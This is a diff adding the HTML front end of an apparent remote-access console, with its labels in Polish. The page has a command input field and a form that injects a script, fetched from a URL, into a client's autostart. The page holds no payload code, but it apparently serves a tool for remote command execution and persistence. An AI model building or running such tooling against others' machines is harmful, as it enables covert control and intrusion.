@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Konsola Zdalnego Dostępu</title>
+
+    <script src="console.js" defer></script>
+    <link rel="stylesheet" href="remoteStyle.css">
+
+</head>
+<body>
+
+    <div id="main">
+        <span id="client_info"></span>
+        <div id="console">
+            <img src="./assets/XD.gif" alt="XD">
+        </div>
+
+        <span>
+            <input type="text" id="input" placeholder="Wprowadź komendę">
+            <button onclick="sendCommand()">Wykonaj</button>
+        </span>
+
+        <span class="script">
+            <input placeholder="Script Name (example.pyw)" type="text" name="filename" id="filename">
+            <input placeholder="URL to Script" type="text" name="fileurl" id="fileurl">
+            <button onclick="InjectScript()" id="injectButton">Inject Script To Autostart</button>
+        </span>
+    </div>
+    
+    
+</body>
+</html>
